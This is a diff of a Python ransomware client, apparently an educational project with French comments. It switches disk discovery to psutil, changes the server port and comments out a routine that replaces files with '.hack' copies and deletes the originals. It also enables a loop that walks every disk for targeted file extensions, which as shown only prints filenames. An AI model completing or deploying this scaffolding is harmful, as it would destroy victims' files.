@@ -4,17 +4,17 @@ import utile.network as network
 import utile.message as message
 import utile.config as config
 from platform import node, win32_edition, system
-from time import time
 from hashlib import sha256
 from re import search
 from os import path
 import random
 import shutil
+import psutil
 
 # Constantes
 DEBUG_MODE = False
 AES_GCM = True
-PORT_SERV_FRONTAL = 8381
+PORT_SERV_FRONTAL = 8443
 LAST_STATE = None
 
 
@@ -88,15 +88,10 @@ def os_type():
 
 
 def list_disks():
-    alphabet = 'abcdefghijklmnopqrstuvwxyz'
-    # return ['%s:' % d for d in dl if path.exists('%s:' % d)]
-    disks = ''
-    for lettre in alphabet.upper():
-        if path.exists('%s:' % lettre):
-            if disks != '':
-                disks += ','
-            disks += f'{lettre}:'
-    return disks
+    partitions = psutil.disk_partitions()
+    # Ne filtre pas par type de disque pour inclure tous les disques connectés
+    disques = [partition.device for partition in partitions]
+    return disques
 
 
 def explore(chemin):
@@ -121,26 +116,27 @@ def file_type(fichier):
 
 
 def chiffre(fichier_source):
-    if not os.path.exists(fichier_source):
-        print("Le fichier spécifié n'existe pas.")
-        return
-
-    if not os.path.isfile(fichier_source):
-        print("Le chemin spécifié ne correspond pas à un fichier.")
-        return
-
-    # Obtient le nom du fichier sans extension
-    nom_fichier, extension = os.path.splitext(fichier_source)
-    # Crée le nouveau nom de fichier avec l'extension .hack
-    fichier_cible = nom_fichier + ".hack"
-
-    # Copie le contenu du fichier source vers le fichier cible
-    shutil.copyfile(fichier_source, fichier_cible)
-    print(f"Fichier copié de {fichier_source} vers {fichier_cible}")
-
-    # Supprime le fichier source
-    os.remove(fichier_source)
-    print(f"Fichier source {fichier_source} supprimé.")
+    # if not os.path.exists(fichier_source):
+    #     print("Le fichier spécifié n'existe pas.")
+    #     return
+    #
+    # if not os.path.isfile(fichier_source):
+    #     print("Le chemin spécifié ne correspond pas à un fichier.")
+    #     return
+    #
+    # # Obtient le nom du fichier sans extension
+    # nom_fichier, extension = os.path.splitext(fichier_source)
+    # # Crée le nouveau nom de fichier avec l'extension .hack
+    # fichier_cible = nom_fichier + ".hack"
+    #
+    # # Copie le contenu du fichier source vers le fichier cible
+    # shutil.copyfile(fichier_source, fichier_cible)
+    # print(f"Fichier copié de {fichier_source} vers {fichier_cible}")
+    #
+    # # Supprime le fichier source
+    # os.remove(fichier_source)
+    # print(f"Fichier source {fichier_source} supprimé.")
+    return None
 
 
 def simulate_hash(longueur=0):
@@ -167,27 +163,28 @@ def main():
     if LAST_STATE is None:
         initialize()
 
-    if LAST_STATE == 'INITIALIZE' or LAST_STATE == 'CRYPT' or LAST_STATE == 'PENDING':
-        # state_config = config.get_config('LAST_STATE')
-        # if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
-        #     return None
-        #
-        # disks = config.get_config('DISKS')
-        # paths = config.get_config('PATHS')
-        # file_ext = config.get_config('FILE_EXT')
-        # nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
-        # if nb_files_encrypted is None:
-        #     nb_files_encrypted = 0
-        #
-        # for disk in disks:
-        #     os.chdir(disk)
-        #     for folder_path in paths:
-        #         for (root, dirs, files) in os.walk(folder_path, topdown=True):
-        #             for filename in files:
-        #                 if os.path.splitext(filename)[1] in file_ext:  # Si l'extension est dans les types à chiffrer
-        #                     nb_files_encrypted += chiffre(f"{root}\{filename}")
-        #     print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
-        print("ok")
+    if LAST_STATE == 'INITIALIZE'   :
+        state_config = config.get_config('LAST_STATE')
+        if state_config != "INITIALIZE" and state_config != "CRYPT" and state_config != "PENDING":
+            return None
+
+        disks = config.get_config('DISKS')
+        paths = config.get_config('PATHS')
+        file_ext = config.get_config('FILE_EXT')
+        nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
+        if nb_files_encrypted is None:
+            nb_files_encrypted = 0
+
+        for disk in disks:
+            os.chdir(disk)
+            for folder_path in paths:
+                for (root, dirs, files) in os.walk(folder_path, topdown=True):
+                    for filename in files:
+                        if os.path.splitext(filename)[1] in file_ext:  # Si l'extension est dans les types à chiffrer
+                            #nb_files_encrypted += chiffre(f"{root}\{filename}")
+                            print(filename)
+            print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
+        print("Chiffrement fait ? ")
 
 
 if __name__ == '__main__':
